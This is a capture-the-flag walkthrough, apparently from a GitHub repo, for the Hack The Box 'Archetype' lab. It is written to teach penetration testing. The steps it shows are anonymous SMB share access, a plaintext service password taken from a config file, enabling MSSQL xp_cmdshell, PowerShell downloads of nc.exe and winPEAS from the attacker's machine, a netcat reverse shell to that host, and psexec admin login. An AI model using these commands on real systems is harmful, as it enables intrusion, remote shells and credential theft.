# Archetype

## Nmap & Footprinting

- Run an nmap scan to collect IP, OS, version, scripts, and trace route information
	* `sudo nmap -sV -sC -oA ./nmap/archetype 10.129.181.76`
- TCP port that is hosting the database is port `1433`

![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/nmap_scan.png)

## SMB Shares

- Run smbclient command to view smb shares
	* `smbclient -N -L \\\\10.129.16.28\\`
	* Name of the non-administrative share available over SMB is `backups`we can tell this is the non-administrative share because all administrative shares are marked with `$`.

![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/sharename.png)

- Access the SMB share "backups" to obtain username and password:
	* `smbclient -N \\\\10.129.16.28\\backups`
	* `ls`
	* `get prod.dtsconfig`
	* `exit`
	* `echo "M3g4c0rp123;User ID=ARCHETYPE\sql_svc" > user.txt`

- The password identified in the SMB share is `M3g4c0rp123`

![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/user_password.png)

## MS SQL Client

- `Mssqlclient.py` script from impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server. Since the credentials for the share has been acquired, locate and access MS SQL Client:
	* `locate mssqlclient`
	* `/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.16.28 -windows-auth`
	* Password: `M3g4c0rp123`

![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/accessing_mssqlclient.png)

## XP Command Shell

- `Xp_cmdshell` extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell. Enable the xp_cmdshell, upload an Netcat listener and a reverse shell to establish a direct command line access.
	* `help`
	* `enable xp_cmdshell`
	* `RECONFIGURE`
	* `xp_cmdshell "whoami"`
## Netcat

* Locate the "nc.exe" file on machine, if not installed, it will need to be installed.
* In a separate terminal in Kali navigate to the directory where the "nc.exe" is and run: `sudo python3 -m http.server 80`
	* Go back to xp_cmdshell and download "nc.exe" from local machine to target `xp_cmdshell powershell -c cd c:\Users\sql_svc\Downloads\; wget http://10.10.16.233/nc.exe -outfile nc.exe`
	* The Netcat was downloaded to the target successfully after receiving the "200" status response code.
* Open another terminal in Kali and navigate to the directory above and and run `nc -lvnp 4444`
	* Execute `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.16.233 4444`

	![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/xp_cmdshell_netcat.png)

	* Navigate to the directory that contains Flag1
		
	![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/flag.txt.png)

## winPEAS

* `WinPEAS script` can be used in order to search possible paths to escalate privileges on Windows hosts. Since there is no access to the Admin directory, winPEAS will be used to acquire the admin credentials.
	* Enter `powershell` 
	* `wget http://10.10.16.233/winPEASx64.exe -outfile winPEAS.exe`
	* Run `.\winPEAS.exe`
			
	![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/winpeas.png)

	* `ConsoleHost_history.txt` contains the admin password. Locate the Administrative credentials, copy and paste credentials into Kali.
	* In Kali, enter `locate psexec`
	* Enter `/usr/bin/impacket-psexec administrator@10.129.181.76`
	* Enter password 
	* Locate the root flag
			
	![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/root.txt.png)

Tags: Networks, Protocols, MSSQL, SMB, Impacket, Powershell, Penetration Tester, Reconnaissance, Remote Code Execution, Clear Text Credentials, Information Disclosure, Anonymous/Guest Access 
